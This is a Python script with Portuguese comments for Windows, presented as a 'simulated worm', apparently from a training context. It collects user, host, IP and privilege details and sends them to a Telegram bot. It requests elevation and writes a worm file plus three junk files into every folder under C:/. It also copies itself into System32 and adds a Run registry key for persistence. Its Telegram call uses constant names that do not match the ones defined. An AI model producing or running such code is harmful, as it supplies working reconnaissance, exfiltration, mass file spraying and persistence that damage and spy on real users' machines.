import os
import shutil
import socket
import platform
import psutil
import ctypes
import sys
from tkinter import messagebox, Tk
import requests
import random
import string

# Configuração do Telegram
TOKEN_TELEGRAM = "<SEU_TOKEN_TELEGRAM>"
ID_CHAT_TELEGRAM = "<SEU_ID_TELEGRAM>"

def obter_detalhes_sistema():
    """
    Coleta detalhes do sistema, como IPs, sistema operacional e usuário atual.
    """
    try:
        hostname = socket.gethostname()
        usuario = os.getlogin()
        sistema = platform.platform()

        # Captura todos os IPs da máquina
        ips = []
        for interface, addrs in psutil.net_if_addrs().items():
            for addr in addrs:
                if addr.family == socket.AF_INET:
                    ips.append(addr.address)

        # Verifica privilégios administrativos
        privilegios = "Concedidos ✅" if verificar_admin() else "Não Concedidos ❌"

        detalhes = (
            f"🔎 <b>Detalhes do Sistema:</b>\n"
            f"👤 <b>Usuário:</b> {usuario}\n"
            f"💻 <b>Host:</b> {hostname}\n"
            f"🌐 <b>IPs:</b> {' | '.join(ips)}\n"
            f"🖥️ <b>Sistema:</b> {sistema}\n"
            f"🔐 <b>Privilégios Administrativos:</b> {privilegios}\n"
        )
        return detalhes
    except Exception as e:
        return f"Erro ao coletar detalhes do sistema: {e}"

def enviar_alerta_arquivo(nome_arquivo):
    """
    Envia alerta ao Telegram sobre a execução do worm.
    """
    pasta_atual = os.path.dirname(os.path.abspath(nome_arquivo))
    detalhes_sistema = obter_detalhes_sistema()
    mensagem = (
        f"🔴 <b>ALERTA CRÍTICO: Worm '{nome_arquivo}' foi ativado!</b>\n"
        f"📂 <b>Localização:</b> {pasta_atual}\n"
        f"{detalhes_sistema}"
    )
    try:
        url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage"
        payload = {"chat_id": TELEGRAM_CHAT_ID, "text": mensagem, "parse_mode": "HTML"}
        requests.post(url, data=payload)
        print(f"Alerta enviado ao Telegram: {mensagem}")
    except Exception as e:
        print(f"Erro ao enviar alerta ao Telegram: {e}")

def verificar_admin():
    """
    Verifica se o script está sendo executado como administrador.
    """
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except Exception as e:
        print(f"Erro ao verificar privilégios: {e}")
        return False

def escalar_privilegios():
    """
    Escala privilégios para administrador caso necessário.
    """
    if not verificar_admin():
        print("Tentando escalar privilégios...")
        try:
            ctypes.windll.shell32.ShellExecuteW(
                None, "runas", sys.executable, __file__, None, 1
            )
            os._exit(0)  # Saída limpa após escalar privilégios
        except Exception as e:
            print(f"Erro ao tentar escalar privilégios: {e}")
            os._exit(1)

def propagar_em_todas_as_pastas():
    """
    Simula a propagação do worm para todas as pastas do sistema.
    """
    for root, dirs, files in os.walk("C:/"):
        for nome_pasta in dirs:
            caminho_completo = os.path.join(root, nome_pasta)
            try:
                # Cria um arquivo "worm" dentro da pasta
                nome_arquivo = "worm_simulado.py"
                caminho_arquivo = os.path.join(caminho_completo, nome_arquivo)

                with open(caminho_arquivo, "w") as f:
                    f.write("# Este é um worm simulado que se propaga em todas as pastas.\n")
                    f.write("print('Worm replicado com sucesso neste diretório.')\n")

                # Cria arquivos adicionais em cada pasta
                for _ in range(3):  # Cria 3 arquivos aleatórios por pasta
                    nome_arquivo_extra = ''.join(random.choices(string.ascii_letters, k=8)) + ".txt"
                    caminho_extra = os.path.join(caminho_completo, nome_arquivo_extra)
                    with open(caminho_extra, "w") as f:
                        f.write("Este arquivo foi criado pelo worm simulado.\n")
                    print(f"Arquivo adicional criado: {caminho_extra}")

                print(f"Worm replicado em: {caminho_completo}")

            except Exception as e:
                print(f"Erro ao replicar worm em {caminho_completo}: {e}")

def criar_persistencia():
    """
    Cria persistência no sistema para o worm simulado.
    """
    try:
        # Diretório onde o worm ficará residente
        caminho_persistencia = "C:/Windows/System32/worm_senai_persistencia/"
        os.makedirs(caminho_persistencia, exist_ok=True)

        # Copiar o worm para o diretório de persistência
        destino_persistente = os.path.join(caminho_persistencia, "worm_persistente.py")
        shutil.copy(__file__, destino_persistente)

        # Adicionar persistência no registro
        os.system(
            f'reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v WormSenai /t REG_SZ /d "{destino_persistente}" /f'
        )
        print("Persistência adicionada ao sistema.")
    except Exception as e:
        print(f"Erro ao criar persistência: {e}")

def exibir_popup(txt_correspondente):
    """
    Exibe um pop-up estilo retro perguntando se o arquivo explicativo foi lido.
    """
    root = Tk()
    root.withdraw()  # Esconde a janela principal do Tkinter

    while True:
        resposta = messagebox.askquestion(
            "Confirmação Necessária",
            f"Você leu o arquivo explicativo '{txt_correspondente}'?\n\n"
            "Por favor, leia antes de continuar."
        )

        if resposta.lower() in ["yes", "sim"]:
            messagebox.showinfo("Confirmado", "Obrigado por confirmar.")
            return True
        elif resposta.lower() in ["no", "não", "nao"]:
            messagebox.showwarning("Leitura Necessária", "Por favor, leia o arquivo antes de continuar.")
            return False

if __name__ == "__main__":
    # Escala privilégios caso necessário
    escalar_privilegios()

    # Detecta o tipo do arquivo executado (.py ou .exe)
    nome_arquivo = os.path.basename(sys.argv[0])
    enviar_alerta_arquivo(nome_arquivo)

    # Pergunta ao usuário sobre o arquivo explicativo
    txt_correspondente = f"{os.path.splitext(nome_arquivo)[0]}.txt"
    if exibir_popup(txt_correspondente):
        print("Processo confirmado pelo usuário.")
        
        propagar_em_todas_as_pastas()
        criar_persistencia()
